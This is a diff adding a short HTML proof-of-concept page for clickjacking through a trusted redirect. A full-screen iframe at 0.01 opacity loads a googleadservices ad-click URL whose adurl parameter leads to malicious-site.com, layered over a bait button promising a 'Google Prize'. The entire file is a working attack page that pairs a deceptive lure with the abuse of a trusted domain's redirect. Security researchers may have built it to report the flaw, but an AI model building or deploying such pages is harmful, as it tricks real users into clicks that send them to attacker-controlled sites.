@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Trusted Redirect Clickjacking</title>
+  <style>
+    iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      opacity: 0.01;
+      z-index: 999;
+      border: none;
+    }
+    .bait {
+      position: relative;
+      z-index: 1;
+      margin-top: 100px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="bait">
+    <h1>Click here to claim your Google Prize</h1>
+    <button>Claim Reward</button>
+  </div>
+  <iframe src="https://www.googleadservices.com/pagead/aclk?sa=L&ai=CGBXQlSMNXoLsOdLY-QPT_6mwDOH5l_ZWr4Sv2MUJtJAfEAEgu9udJGDp2uODkA6gAeWhsuwDyAEGqAMBqgTNAU_QFKatitkRDK80W7y4jdsACqLyGHin0drMoK7isVfn1Q6E54mdEzoJyudbpcUgXDUNx_-O1uhcFhyHqUfKPhsEVToX8XheJUOFvTXIBvrOxMr8xMOF3kxLjcLTuFxbGRTmll3CSFQQMt8E1vqEGN0ZQinKOfjAzWfGy1sxReSLvhXSj12IRAlj8IZhto1BWfvJpR0l7fAHyseiTHviUsajxCVhJHEj87Om3tDSGD4H7Yi2hl_qWZLB0Zf_kdb7lhHrd_ibrS5gJ6aLu13ABLG3_5_0AYgFq9OwmAaQBgGgBjfYBgKAB8L7kGaIBwGQBwKoB47OG6gH1ckbqAeT2BuoB7oGqAfy2RuoB6a-G6gH7NUbqAfs1RvYBwCgCPrAPagIAbAIAtIIBggAEAIYArEJ2zKUP3FiKFGAChPICwXYEwyCFBEaD21haWwuZ29vZ2xlLmNvbagVAw&num=1&cid=CAQSIgDwy9IZTjlWLxhX4NB1exm9rOKn1lIgGv5SsfWWd6g70Vo&sig=AOD64_2NHJCwL0_xkRZpgFG5PoSSlIjeNA&adurl=http://malicious-site.com"></iframe>
+</body>
+</html>
